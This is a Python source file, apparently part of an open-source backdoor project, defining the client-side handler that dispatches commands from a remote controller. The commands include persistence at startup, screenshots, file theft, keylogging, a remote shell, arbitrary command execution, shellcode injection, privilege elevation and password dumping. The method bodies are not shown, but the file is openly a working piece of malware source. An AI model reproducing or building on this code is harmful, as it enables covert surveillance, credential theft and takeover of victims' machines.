"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
from src.definitions.commands import *


class CommandHandler:

    def __init__(self, control):
        self.control = control

    def parse(self, command):

        _command = command["key"]

        if _command == CLIENT_EXIT:
            self.control.close()
        elif _command == CLIENT_ADD_STARTUP:
            self.control.add_startup()
        elif _command == CLIENT_RMV_STARTUP:
            self.control.add_startup(True)
        elif _command == CLIENT_SCREENSHOT:
            self.control.screenshot()
        elif _command == CLIENT_UPLOAD_FILE:
            self.control.download(command["value"]["buffer"], command["value"]["value"])
        elif _command == CLIENT_DWNL_DIR:
            self.control.upload_dir(command["value"])
        elif _command == CLIENT_DWNL_FILE:
            self.control.upload(command["value"])
        elif _command == CLIENT_LOCK:
            self.control.lock()
        elif _command == CLIENT_HEARTBEAT:
            self.control.heartbeat()
        elif _command == CLIENT_SHELL:
            self.control.command_shell()
        elif _command == CLIENT_PYTHON_INTERPRETER:
            self.control.python_interpreter()
        elif _command == CLIENT_KEYLOG_START:
            self.control.keylogger_start()
        elif _command == CLIENT_KEYLOG_STOP:
            self.control.keylogger_stop()
        elif _command == CLIENT_KEYLOG_DUMP:
            self.control.keylogger_dump()
        elif _command == CLIENT_RUN_CMD:
            self.control.run_command(command["value"])
        elif _command == CLIENT_DISABLE_PROCESS:
            self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
        elif _command == CLIENT_SHELLCODE:
            self.control.inject_shellcode(command["value"]["buffer"])
        elif _command == CLIENT_ELEVATE:
            self.control.elevate()
        elif _command == CLIENT_PWD:
            self.control.password_dump(command["value"])
        elif _command == CLIENT_GET_VULN:
            self.control.get_vuln(command["value"])

